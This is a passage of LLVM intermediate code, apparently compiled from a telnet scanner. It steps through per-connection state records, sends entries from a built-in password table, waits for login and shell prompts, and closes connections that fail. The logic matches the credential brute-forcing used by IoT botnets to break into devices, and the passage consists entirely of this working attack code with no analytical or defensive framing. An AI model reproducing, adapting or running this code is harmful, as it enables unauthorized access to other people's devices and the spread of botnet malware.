  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %995, i32 0, i32 2
  store i8 0, i8* %996, align 8
  %997 = load i32, i32* %2, align 4
  %998 = sext i32 %997 to i64
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 3
  store i8 0, i8* %1000, align 1
  br label %2304

; <label>:1001:                                   ; preds = %978
  %1002 = load i32, i32* %2, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 8
  %1006 = load i8*, i8** %1005, align 8
  %1007 = call i8* @strstr(i8* %1006, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1008 = icmp ne i8* %1007, null
  br i1 %1008, label %1009, label %1024

; <label>:1009:                                   ; preds = %1001
  %1010 = load i32, i32* %2, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1011
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1012, i32 0, i32 0
  %1014 = load i32, i32* %1013, align 16
  %1015 = call i32 @sclose(i32 %1014)
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 2
  store i8 0, i8* %1019, align 8
  %1020 = load i32, i32* %2, align 4
  %1021 = sext i32 %1020 to i64
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1021
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1022, i32 0, i32 3
  store i8 0, i8* %1023, align 1
  br label %2304

; <label>:1024:                                   ; preds = %1001
  %1025 = load i32, i32* %2, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1026
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1027, i32 0, i32 8
  %1029 = load i8*, i8** %1028, align 8
  %1030 = call i8* @strstr(i8* %1029, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1031 = icmp ne i8* %1030, null
  br i1 %1031, label %1032, label %1047

; <label>:1032:                                   ; preds = %1024
  %1033 = load i32, i32* %2, align 4
  %1034 = sext i32 %1033 to i64
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1034
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1035, i32 0, i32 0
  %1037 = load i32, i32* %1036, align 16
  %1038 = call i32 @sclose(i32 %1037)
  %1039 = load i32, i32* %2, align 4
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1040
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1041, i32 0, i32 2
  store i8 0, i8* %1042, align 8
  %1043 = load i32, i32* %2, align 4
  %1044 = sext i32 %1043 to i64
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1044
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1045, i32 0, i32 3
  store i8 0, i8* %1046, align 1
  br label %2304

; <label>:1047:                                   ; preds = %1024
  %1048 = load i32, i32* %2, align 4
  %1049 = sext i32 %1048 to i64
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1049
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1050, i32 0, i32 8
  %1052 = load i8*, i8** %1051, align 8
  %1053 = call i8* @strstr(i8* %1052, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1054 = icmp ne i8* %1053, null
  br i1 %1054, label %1055, label %1070

; <label>:1055:                                   ; preds = %1047
  %1056 = load i32, i32* %2, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 0
  %1060 = load i32, i32* %1059, align 16
  %1061 = call i32 @sclose(i32 %1060)
  %1062 = load i32, i32* %2, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1063
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1064, i32 0, i32 2
  store i8 0, i8* %1065, align 8
  %1066 = load i32, i32* %2, align 4
  %1067 = sext i32 %1066 to i64
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1067
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1068, i32 0, i32 3
  store i8 0, i8* %1069, align 1
  br label %2304

; <label>:1070:                                   ; preds = %1047
  %1071 = load i32, i32* %2, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1072
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1073, i32 0, i32 8
  %1075 = load i8*, i8** %1074, align 8
  %1076 = call i8* @strstr(i8* %1075, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1077 = icmp ne i8* %1076, null
  br i1 %1077, label %1078, label %1093

; <label>:1078:                                   ; preds = %1070
  %1079 = load i32, i32* %2, align 4
  %1080 = sext i32 %1079 to i64
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1080
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1081, i32 0, i32 0
  %1083 = load i32, i32* %1082, align 16
  %1084 = call i32 @sclose(i32 %1083)
  %1085 = load i32, i32* %2, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1086
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1087, i32 0, i32 2
  store i8 0, i8* %1088, align 8
  %1089 = load i32, i32* %2, align 4
  %1090 = sext i32 %1089 to i64
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1090
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1091, i32 0, i32 3
  store i8 0, i8* %1092, align 1
  br label %2304

; <label>:1093:                                   ; preds = %1070
  %1094 = load i32, i32* %2, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1095
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1096, i32 0, i32 8
  %1098 = load i8*, i8** %1097, align 8
  %1099 = call i64 @strlen(i8* %1098) #10
  %1100 = trunc i64 %1099 to i16
  %1101 = load i32, i32* %2, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 7
  store i16 %1100, i16* %1104, align 16
  br label %1105

; <label>:1105:                                   ; preds = %1093
  %1106 = load i32, i32* %2, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 6
  %1110 = load i32, i32* %1109, align 4
  %1111 = add i32 %1110, 10
  %1112 = zext i32 %1111 to i64
  %1113 = call i64 @time(i64* null) #2
  %1114 = icmp slt i64 %1112, %1113
  br i1 %1114, label %1115, label %1130

; <label>:1115:                                   ; preds = %1105
  %1116 = load i32, i32* %2, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 0
  %1120 = load i32, i32* %1119, align 16
  %1121 = call i32 @sclose(i32 %1120)
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 2
  store i8 0, i8* %1125, align 8
  %1126 = load i32, i32* %2, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1127
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1128, i32 0, i32 3
  store i8 1, i8* %1129, align 1
  br label %1130

; <label>:1130:                                   ; preds = %1115, %1105
  br label %2303

; <label>:1131:                                   ; preds = %69
  %1132 = load i32, i32* %2, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1134, i32 0, i32 0
  %1136 = load i32, i32* %1135, align 16
  %1137 = load i32, i32* %2, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 5
  %1141 = load i8, i8* %1140, align 1
  %1142 = zext i8 %1141 to i64
  %1143 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1142
  %1144 = load i8*, i8** %1143, align 8
  %1145 = load i32, i32* %2, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1146
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1147, i32 0, i32 5
  %1149 = load i8, i8* %1148, align 1
  %1150 = zext i8 %1149 to i64
  %1151 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1150
  %1152 = load i8*, i8** %1151, align 8
  %1153 = call i64 @strlen(i8* %1152) #10
  %1154 = call i64 @send(i32 %1136, i8* %1144, i64 %1153, i32 16384)
  %1155 = icmp slt i64 %1154, 0
  br i1 %1155, label %1156, label %1171

; <label>:1156:                                   ; preds = %1131
  %1157 = load i32, i32* %2, align 4
  %1158 = sext i32 %1157 to i64
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1158
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1159, i32 0, i32 0
  %1161 = load i32, i32* %1160, align 16
  %1162 = call i32 @sclose(i32 %1161)
  %1163 = load i32, i32* %2, align 4
  %1164 = sext i32 %1163 to i64
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1164
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1165, i32 0, i32 2
  store i8 0, i8* %1166, align 8
  %1167 = load i32, i32* %2, align 4
  %1168 = sext i32 %1167 to i64
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1168
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1169, i32 0, i32 3
  store i8 1, i8* %1170, align 1
  br label %2304

; <label>:1171:                                   ; preds = %1131
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 0
  %1176 = load i32, i32* %1175, align 16
  %1177 = call i64 @send(i32 %1176, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1178 = icmp slt i64 %1177, 0
  br i1 %1178, label %1179, label %1194

; <label>:1179:                                   ; preds = %1171
  %1180 = load i32, i32* %2, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 0
  %1184 = load i32, i32* %1183, align 16
  %1185 = call i32 @sclose(i32 %1184)
  %1186 = load i32, i32* %2, align 4
  %1187 = sext i32 %1186 to i64
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1187
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1188, i32 0, i32 2
  store i8 0, i8* %1189, align 8
  %1190 = load i32, i32* %2, align 4
  %1191 = sext i32 %1190 to i64
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1191
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1192, i32 0, i32 3
  store i8 1, i8* %1193, align 1
  br label %2304

; <label>:1194:                                   ; preds = %1171
  %1195 = load i32, i32* %2, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 2
  store i8 6, i8* %1198, align 8
  br label %2303

; <label>:1199:                                   ; preds = %69
  %1200 = load i32, i32* %2, align 4
  %1201 = sext i32 %1200 to i64
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1201
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1202, i32 0, i32 6
  %1204 = load i32, i32* %1203, align 4
  %1205 = icmp eq i32 %1204, 0
  br i1 %1205, label %1206, label %1213

; <label>:1206:                                   ; preds = %1199
  %1207 = call i64 @time(i64* null) #2
  %1208 = trunc i64 %1207 to i32
  %1209 = load i32, i32* %2, align 4
  %1210 = sext i32 %1209 to i64
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1210
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1211, i32 0, i32 6
  store i32 %1208, i32* %1212, align 4
  br label %1213

; <label>:1213:                                   ; preds = %1206, %1199
  %1214 = load i32, i32* %2, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 0
  %1218 = load i32, i32* %1217, align 16
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 8
  %1223 = load i8*, i8** %1222, align 8
  %1224 = load i32, i32* %2, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 7
  %1228 = load i16, i16* %1227, align 16
  %1229 = zext i16 %1228 to i32
  %1230 = call i32 @readUntil(i32 %1218, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1223, i32 1024, i32 %1229)
  %1231 = icmp ne i32 %1230, 0
  br i1 %1231, label %1232, label %1307

; <label>:1232:                                   ; preds = %1213
  %1233 = load i32, i32* %2, align 4
  %1234 = sext i32 %1233 to i64
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1234
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1235, i32 0, i32 6
  store i32 0, i32* %1236, align 4
  %1237 = load i32, i32* %2, align 4
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1238
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1239, i32 0, i32 7
  store i16 0, i16* %1240, align 16
  %1241 = load i32, i32* %2, align 4
  %1242 = sext i32 %1241 to i64
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 8
  %1245 = load i8*, i8** %1244, align 8
  %1246 = call i8* @strstr(i8* %1245, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1247 = icmp ne i8* %1246, null
  br i1 %1247, label %1248, label %1268

; <label>:1248:                                   ; preds = %1232
  %1249 = load i32, i32* %2, align 4
  %1250 = sext i32 %1249 to i64
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1250
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1251, i32 0, i32 8
  %1253 = load i8*, i8** %1252, align 8
  call void @llvm.memset.p0i8.i64(i8* %1253, i8 0, i64 1024, i32 1, i1 false)
  %1254 = load i32, i32* %2, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 0
  %1258 = load i32, i32* %1257, align 16
  %1259 = call i32 @sclose(i32 %1258)
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 2
  store i8 0, i8* %1263, align 8
  %1264 = load i32, i32* %2, align 4
  %1265 = sext i32 %1264 to i64
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1265
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1266, i32 0, i32 3
  store i8 0, i8* %1267, align 1
  br label %2304

; <label>:1268:                                   ; preds = %1232
  %1269 = load i32, i32* %2, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1270
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1271, i32 0, i32 8
  %1273 = load i8*, i8** %1272, align 8
  %1274 = call i32 @matchPrompt(i8* %1273)
  %1275 = icmp ne i32 %1274, 0
  br i1 %1275, label %1296, label %1276

; <label>:1276:                                   ; preds = %1268
  %1277 = load i32, i32* %2, align 4
  %1278 = sext i32 %1277 to i64
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1278
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1279, i32 0, i32 8
  %1281 = load i8*, i8** %1280, align 8
  call void @llvm.memset.p0i8.i64(i8* %1281, i8 0, i64 1024, i32 1, i1 false)
  %1282 = load i32, i32* %2, align 4
  %1283 = sext i32 %1282 to i64
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1283
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1284, i32 0, i32 0
  %1286 = load i32, i32* %1285, align 16
  %1287 = call i32 @sclose(i32 %1286)
  %1288 = load i32, i32* %2, align 4
  %1289 = sext i32 %1288 to i64
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1290, i32 0, i32 2
  store i8 0, i8* %1291, align 8
  %1292 = load i32, i32* %2, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1293
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1294, i32 0, i32 3
  store i8 1, i8* %1295, align 1
  br label %2304

; <label>:1296:                                   ; preds = %1268
  %1297 = load i32, i32* %2, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 2
  store i8 7, i8* %1300, align 8
  br label %1301

; <label>:1301:                                   ; preds = %1296
  %1302 = load i32, i32* %2, align 4
  %1303 = sext i32 %1302 to i64
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1303
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1304, i32 0, i32 8
  %1306 = load i8*, i8** %1305, align 8
  call void @llvm.memset.p0i8.i64(i8* %1306, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1307:                                   ; preds = %1213
  %1308 = load i32, i32* %2, align 4
  %1309 = sext i32 %1308 to i64
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1309
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1310, i32 0, i32 0
  %1312 = load i32, i32* %1311, align 16
  %1313 = load i32, i32* %2, align 4
  %1314 = sext i32 %1313 to i64
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1314
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1315, i32 0, i32 8
  %1317 = load i8*, i8** %1316, align 8
  %1318 = load i32, i32* %2, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 7
  %1322 = load i16, i16* %1321, align 16
  %1323 = zext i16 %1322 to i32
  %1324 = call i32 @readUntil(i32 %1312, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1317, i32 1024, i32 %1323)
  %1325 = icmp ne i32 %1324, 0
  br i1 %1325, label %1326, label %1401

; <label>:1326:                                   ; preds = %1307
  %1327 = load i32, i32* %2, align 4
  %1328 = sext i32 %1327 to i64
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1328
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1329, i32 0, i32 6
  store i32 0, i32* %1330, align 4
  %1331 = load i32, i32* %2, align 4
  %1332 = sext i32 %1331 to i64
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1332
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1333, i32 0, i32 7
  store i16 0, i16* %1334, align 16
  %1335 = load i32, i32* %2, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1336
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1337, i32 0, i32 8
  %1339 = load i8*, i8** %1338, align 8
  %1340 = call i8* @strstr(i8* %1339, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1341 = icmp ne i8* %1340, null
  br i1 %1341, label %1342, label %1362

; <label>:1342:                                   ; preds = %1326
  %1343 = load i32, i32* %2, align 4
  %1344 = sext i32 %1343 to i64
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1344
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1345, i32 0, i32 8
  %1347 = load i8*, i8** %1346, align 8
  call void @llvm.memset.p0i8.i64(i8* %1347, i8 0, i64 1024, i32 1, i1 false)
  %1348 = load i32, i32* %2, align 4
  %1349 = sext i32 %1348 to i64
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1349
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1350, i32 0, i32 0
  %1352 = load i32, i32* %1351, align 16
  %1353 = call i32 @sclose(i32 %1352)
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 2
  store i8 0, i8* %1357, align 8
  %1358 = load i32, i32* %2, align 4
  %1359 = sext i32 %1358 to i64
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1359
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1360, i32 0, i32 3
  store i8 0, i8* %1361, align 1
  br label %2304

; <label>:1362:                                   ; preds = %1326
  %1363 = load i32, i32* %2, align 4
  %1364 = sext i32 %1363 to i64
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1364
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1365, i32 0, i32 8
  %1367 = load i8*, i8** %1366, align 8
  %1368 = call i32 @matchPrompt(i8* %1367)
  %1369 = icmp ne i32 %1368, 0
  br i1 %1369, label %1390, label %1370

; <label>:1370:                                   ; preds = %1362
  %1371 = load i32, i32* %2, align 4
  %1372 = sext i32 %1371 to i64
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1372
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1373, i32 0, i32 8
  %1375 = load i8*, i8** %1374, align 8
  call void @llvm.memset.p0i8.i64(i8* %1375, i8 0, i64 1024, i32 1, i1 false)
  %1376 = load i32, i32* %2, align 4
  %1377 = sext i32 %1376 to i64
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1377
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1378, i32 0, i32 0
  %1380 = load i32, i32* %1379, align 16
  %1381 = call i32 @sclose(i32 %1380)
  %1382 = load i32, i32* %2, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 2
  store i8 0, i8* %1385, align 8
  %1386 = load i32, i32* %2, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1387
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1388, i32 0, i32 3
  store i8 1, i8* %1389, align 1
  br label %2304

; <label>:1390:                                   ; preds = %1362
  %1391 = load i32, i32* %2, align 4
  %1392 = sext i32 %1391 to i64
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1392
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1393, i32 0, i32 2
  store i8 7, i8* %1394, align 8
  br label %1395

; <label>:1395:                                   ; preds = %1390
  %1396 = load i32, i32* %2, align 4
  %1397 = sext i32 %1396 to i64
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1397
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1398, i32 0, i32 8
  %1400 = load i8*, i8** %1399, align 8
  call void @llvm.memset.p0i8.i64(i8* %1400, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:1401:                                   ; preds = %1307
  %1402 = load i32, i32* %2, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1404, i32 0, i32 0
  %1406 = load i32, i32* %1405, align 16
  %1407 = load i32, i32* %2, align 4
  %1408 = sext i32 %1407 to i64
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1408
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1409, i32 0, i32 8
  %1411 = load i8*, i8** %1410, align 8
  %1412 = load i32, i32* %2, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 7
  %1416 = load i16, i16* %1415, align 16
  %1417 = zext i16 %1416 to i32
  %1418 = call i32 @readUntil(i32 %1406, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1411, i32 1024, i32 %1417)
  %1419 = icmp ne i32 %1418, 0
  br i1 %1419, label %1420, label %1467

; <label>:1420:                                   ; preds = %1401
  %1421 = load i32, i32* %2, align 4
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1422
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1423, i32 0, i32 6
  store i32 0, i32* %1424, align 4
  %1425 = load i32, i32* %2, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 7
  store i16 0, i16* %1428, align 16
  %1429 = load i32, i32* %2, align 4
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1430
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1431, i32 0, i32 8
  %1433 = load i8*, i8** %1432, align 8
